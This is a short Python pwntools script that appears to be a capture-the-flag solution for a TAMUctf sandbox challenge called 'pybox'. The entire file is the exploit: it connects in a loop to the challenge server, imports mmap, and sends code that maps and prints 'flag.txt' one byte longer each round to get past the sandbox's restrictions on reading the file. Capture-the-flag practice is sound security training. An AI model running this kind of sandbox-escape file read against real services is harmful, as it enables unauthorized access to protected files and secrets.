from pwn import *

if __name__ == "__main__":
    context.log_level = "critical"
    i = 1

    while True:
        io = remote("tamuctf.com", 443, ssl=True, sni="pybox")

        io.recvuntil("?\n")
        io.sendline("1")
        io.recvuntil("line\n")
        io.sendline("mmap")
        io.recvuntil(")\n")

        io.sendline("f = open('flag.txt', 'rb')")
        io.sendline(f"flag = mmap.mmap(f.fileno(), {i}, flags=mmap.MAP_PRIVATE)")
        io.sendline(f"print(flag[:{i}])")
        io.sendline(".")
        
        flag = bytearray(io.recv(1024).strip())
        if b"Traceback" in flag:
            break
        print(flag.decode())

        i += 1

